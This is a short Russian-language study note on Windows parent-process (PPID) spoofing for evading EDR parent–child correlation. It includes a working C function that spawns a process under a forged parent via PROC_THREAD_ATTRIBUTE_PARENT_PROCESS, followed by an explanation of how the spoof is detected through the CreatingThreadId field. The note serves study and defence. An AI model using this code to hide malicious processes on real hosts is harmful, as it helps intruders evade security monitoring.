
Почти у каждого EDR есть способ корреляции родительских и дочерних процессов в системе. Это позволяет агенту выявлять подозрительные связи между процессами.

Таким образом, чтобы скрыть вредоносное поведение на хосте, атакующие часто хотят подделать родителя своего текущего процесса. Самый распространенный способ добиться этого — изменить список атрибутов процесса и потока дочернего процесса. Этот обход основан на том факте, что в Windows дочерние процессы наследуют определенные атрибуты от родительских процессов, такие как текущий рабочий каталог и переменные окружения.

Пример реализации:
``` C
void SpoofParent() {
    PCHAR szChildProcess = "notepad";
    DWORD dwParentProcessId = 7648;
    HANDLE hParentProcess = NULL;
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T ulSize;
    
    memset(&si, 0, sizeof(STARTUPINFOEXA));
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    
    hParentProcess = OpenProcess(
        PROCESS_CREATE_PROCESS,
        FALSE,
        dwParentProcessId);
        
    InitializeProcThreadAttributeList(NULL, 1, 0, &ulSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(),
        0, ulSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &ulSize);
    
    UpdateProcThreadAttribute(
        si.lpAttributeList,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hParentProcess,
        sizeof(HANDLE),
        NULL, NULL);
        
    CreateProcessA(NULL,
        szChildProcess,
        NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT,
        NULL, NULL,
        &si.StartupInfo, &pi);
        
    CloseHandle(hParentProcess);
    DeleteProcThreadAttributeList(si.lpAttributeList);
}
```

![](../../../../z.%20Images/{368747F3-121C-413E-A075-ADFDAEB16748}.png)

Но эту технику достаточно просто обнаружить. Структура, передаваемая драйверу при событии создания процесса, содержит два отдельных поля, относящихся к родительским процессам: ParentProcessId и CreatingThreadId. Хотя в большинстве нормальных обстоятельств эти два поля будут указывать на один и тот же процесс, при подмене ID родительского процесса (PPID) нового процесса поле CreatingThreadId.UniqueProcess будет содержать PID процесса, который действительно сделал вызов функции создания процесса.